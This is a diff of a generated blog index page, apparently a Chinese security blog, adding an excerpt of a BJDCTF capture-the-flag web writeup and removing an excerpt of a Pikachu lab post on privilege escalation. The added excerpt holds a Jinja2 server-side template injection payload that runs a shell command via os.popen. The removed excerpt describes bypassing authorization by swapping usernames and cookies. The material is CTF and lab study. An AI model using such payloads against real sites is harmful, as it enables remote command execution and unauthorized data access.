@@ -354,6 +354,34 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/article/99fa412f.html" >
+            
+                <span>BJDCTF2nd-Web Writeup</span>
+        </a>
+        <div class="abstract-content">
+            BJDCTF2nd-Web WriteupFake Google
+注释里提示是SSTI,稍微查一下就能理解.直接上payload
+1?name&#x3D;&#123;&#123;[].__class__.__base__.__subclasses__()[64].__init__.__globals__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&#125;&#125;
+
+Old-HackThinkPHP的洞稍微测试一下,连版本号都出来了
+5.0.23是有命令执行的漏洞套网上的pay...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/23</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/article/a40c0fa6.html" >
             
                 <span>随机游程测试步骤</span>
@@ -582,38 +610,6 @@ PHP反序列化存在接收序列化数据的api,我们输入普通的序列化�
 成功读取
 任意文件读取先提交一个filename然后抓包传递的filename参数进行修改夸目录读取
 
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/21</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/article/dab800ae.html" >
-            
-                <span>Pikachu-越权</span>
-        </a>
-        <div class="abstract-content">
-            Pikachu-越权水平越权
-登陆进来发现URL的关键点
-1username&#x3D;xxx
-现在kobe账户是已登陆状态,lili是未登录,我们直接就该kobe为lili,成功读取到lili的信息,造成越权.
-垂直越权先分别用普通账户和admin账户登陆,看看有什么不同普通
-admin
-可以看到admin账户新增对用户的修改,先创建个用户,截获数据包
-然后更换为普通用户,重新发包.将cookie更换为pikachu的cookie,发包可以看到我们添加的用户已经显示出来了
-条件竞争到底还是没搞懂咋回事不过找到了作者的poc
-1234567891011121314151617181920...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -878,9 +874,24 @@ admin
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 21
+        Total : 22
         </div>
         <!-- search  -->
         
@@ -1173,6 +1184,11 @@ admin
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/article/99fa412f.html" >BJDCTF2nd-Web Writeup</a>
+        </li>
     
     
         <li class="archive-post-item">
